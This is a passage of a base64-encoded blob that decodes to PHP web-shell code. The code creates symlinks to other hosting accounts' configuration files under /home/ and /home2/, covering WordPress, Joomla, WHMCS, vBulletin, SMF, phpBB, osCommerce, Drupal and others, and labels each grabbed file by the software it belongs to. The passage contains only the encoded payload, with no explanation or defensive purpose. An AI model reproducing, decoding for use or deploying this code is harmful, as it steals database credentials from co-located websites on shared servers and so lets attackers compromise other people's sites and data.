0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0udHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0udHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy50eHQnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3MudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJsb2dzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj5vcmRwcmVzcy1zaXRlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvb21sYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWNtcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+VkJ1bGxldGluLWZvcnVtLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jcGFuZWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0L2Nvbm